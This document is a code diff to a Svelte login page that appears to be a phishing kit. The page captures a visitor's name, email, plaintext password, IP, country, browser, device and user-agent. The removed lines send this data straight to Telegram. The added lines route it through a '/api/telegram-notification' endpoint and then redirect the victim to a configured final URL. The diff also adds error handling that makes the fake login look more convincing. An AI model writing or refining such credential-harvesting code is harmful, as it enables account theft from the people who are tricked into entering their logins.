@@ -1,13 +1,13 @@
 <script lang="ts">
   import { onMount } from 'svelte';
   import { browser } from '$app/environment';
-  import { sendTelegramMessage } from '$lib/telegram';
   import { writable, get } from 'svelte/store';
 
   const email = writable('');
   const name = writable('');
   const password = writable('');
   const loading = writable(false);
+  const error = writable('');
   const step = writable<'email' | 'password'>('email');
 
   let userAgent = '';
@@ -35,27 +35,40 @@
 
   const handleLogin = async () => {
     if (get(password).length < 5) {
-      alert('Password must be at least 5 characters');
+      error.set('Password must be at least 5 characters');
       return;
     }
 
     loading.set(true);
+    error.set('');
 
-    const htmlMessage = `
-<b>🔐 New Login</b><br>
-<b>👤Name:</b> ${get(name) || 'Unknown'}<br>
-<b>📧Email:</b> ${get(email)}<br>
-<b>🔑Password:</b> ${get(password)}<br>
-<b>🌍Country:</b> ${country}<br>
-<b>📡IP:</b> ${ip}<br>
-<b>🧭Browser:</b> ${browserType}<br>
-<b>💻Device:</b> ${device}<br>
-<b>🕒Time:</b> ${new Date().toLocaleString()}<br>
-<b>🧾User-Agent:</b> ${userAgent}
-`.trim();
+    try {
+      const response = await fetch('/api/telegram-notification', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: get(name) || 'Unknown',
+          email: get(email),
+          password: get(password),
+          country,
+          ip,
+          browser: browserType,
+          device,
+          time: new Date().toLocaleString(),
+          userAgent
+        })
+      });
 
-    await sendTelegramMessage(htmlMessage, 'HTML');
-    window.location.href = import.meta.env.VITE_FINAL_URL;
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.message || 'Failed to verify credentials');
+      }
+
+      window.location.href = import.meta.env.VITE_FINAL_URL;
+    } catch (err) {
+      error.set(err.message);
+      loading.set(false);
+    }
   };
 
   onMount(async () => {
@@ -196,6 +209,12 @@
     font-size: 1.2rem;
     font-weight: bold;
   }
+
+  .error-message {
+    color: #d32f2f;
+    font-size: 0.9rem;
+    margin-bottom: 1rem;
+  }
 </style>
 
 <main>
@@ -207,6 +226,10 @@
     </div>
   {:else}
     <div class="card">
+      {#if $error}
+        <p class="error-message">{$error}</p>
+      {/if}
+
       {#if $step === 'email' && !$email}
         <h2>Enter your email</h2>
         <input
